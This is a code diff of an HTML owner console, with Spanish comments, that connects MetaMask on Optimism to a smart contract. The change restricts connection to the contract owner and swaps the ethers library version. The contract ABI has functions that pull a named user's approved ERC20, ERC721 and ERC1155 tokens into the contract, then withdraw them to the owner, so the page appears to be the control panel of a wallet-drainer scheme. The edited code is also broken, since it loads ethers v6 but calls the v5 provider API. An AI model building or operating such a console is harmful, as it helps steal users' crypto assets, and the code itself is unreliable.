@@ -103,8 +103,7 @@
         <div class="console" id="console"></div>
     </div>
 
-<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
-    <script>
+<script src="https://cdn.jsdelivr.net/npm/ethers@6.2.3/dist/ethers.min.js"></script>    <script>
         let provider;
         let signer;
         let contract;
@@ -112,30 +111,51 @@
 
         const contractABI = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":true,"internalType":"address","name":"asset","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"ApprovalUpdated","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"asset","type":"address"},{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"AssetTransferred","type":"event"},{"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"nftContract","type":"address"}],"name":"checkERC1155Approval","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"token","type":"address"}],"name":"checkERC20Allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"nftContract","type":"address"}],"name":"checkERC721Approval","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address[]","name":"tokensERC20","type":"address[]"},{"internalType":"uint256[]","name":"amounts","type":"uint256[]"},{"internalType":"address[]","name":"contractsERC721","type":"address[]"},{"internalType":"address[]","name":"contractsERC1155","type":"address[]"}],"name":"claimAll","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"},{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"bytes","name":"","type":"bytes"}],"name":"onERC1155Received","outputs":[{"internalType":"bytes4","name":"","type":"bytes4"}],"stateMutability":"pure","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"},{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"bytes","name":"","type":"bytes"}],"name":"onERC721Received","outputs":[{"internalType":"bytes4","name":"","type":"bytes4"}],"stateMutability":"pure","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"nftContract","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferERC1155ToContract","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferERC20ToContract","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"nftContract","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferERC721ToContract","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"transferETHToContract","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"nftContract","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"withdrawERC1155","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"withdrawERC20","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"nftContract","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"withdrawERC721","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"withdrawETH","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}];
 
-        async function connectWallet() {
-    if (typeof window.ethereum !== 'undefined') {
-        try {
-            // Solicitar acceso a la cuenta
-            await window.ethereum.request({ method: 'eth_requestAccounts' });
-            
-            provider = new ethers.providers.Web3Provider(window.ethereum);
-            signer = provider.getSigner();
-            
-            // Verificar red Optimism
-            const network = await provider.getNetwork();
-            if (network.chainId !== 10) { // 10 = Optimism Mainnet
-                alert('Por favor cambia a la red Optimism');
-                return;
+       async function connectWallet() {
+            try {
+                // Verificar si ethers se cargó correctamente
+                if (typeof ethers === 'undefined') {
+                    throw new Error('La librería ethers no se cargó correctamente');
+                }
+
+                if (!window.ethereum) {
+                    throw new Error('Necesitas instalar MetaMask');
+                }
+
+                // Solicitar conexión
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
+                
+                // Configurar provider
+                provider = new ethers.providers.Web3Provider(window.ethereum);
+                
+                // Verificar red
+                const network = await provider.getNetwork();
+                if (network.chainId !== 10) {
+                    alert('Cambia a la red Optimism');
+                    return;
+                }
+
+                // Obtener signer
+                signer = provider.getSigner();
+                
+                // Verificar ownership
+                contract = new ethers.Contract(contractAddress, contractABI, signer);
+                const owner = await contract.owner();
+                const currentAddress = await signer.getAddress();
+
+                if (currentAddress.toLowerCase() !== owner.toLowerCase()) {
+                    throw new Error('No eres el propietario del contrato');
+                }
+
+                document.getElementById('walletStatus').innerHTML = `Conectado: ${currentAddress.slice(0,6)}...`;
+                logToConsole('Conexión exitosa como owner');
+                
+            } catch (error) {
+                logToConsole(`Error: ${error.message}`);
+                console.error(error);
             }
-            
-            // Resto del código...
-        } catch (error) {
-            console.error(error);
         }
-    } else {
-        alert('Por favor instala MetaMask');
-    }
-}
+
 
         async function transferERC20() {
             try {
